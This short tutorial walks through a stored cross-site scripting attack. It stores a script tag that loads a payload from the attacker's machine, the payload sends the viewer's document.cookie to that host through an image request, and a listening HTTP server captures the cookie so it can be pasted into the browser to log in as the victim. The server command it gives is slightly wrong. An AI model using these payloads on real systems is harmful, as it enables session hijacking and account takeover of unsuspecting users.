Stored XSS

The javascript below is to be stored in the database. With the localhost
representing the IP of the current machine being used for the attack.

<script src="http://localhost/xss.js"> 

the code inside of our xss.js ~ this is our malicious code being used to steal
the cookie of whoever views the page. 

document.write('<img src="http://localhost/?'+document.cookie+'">'); 

Next we will turn on a simple server on our machine to listen for whenever someone
views our page, so we can relay the stolen cookie to our machine that is listening.

run sudo python3 -m SimpleHTTPServer 80 on Kali Linux 

Once the cookie is stolen ~ inside of the inspector > storage > cookis 
replace the value with the value of the stolen cookie. 

Then refresh the page and we should be logged-in as the victim.
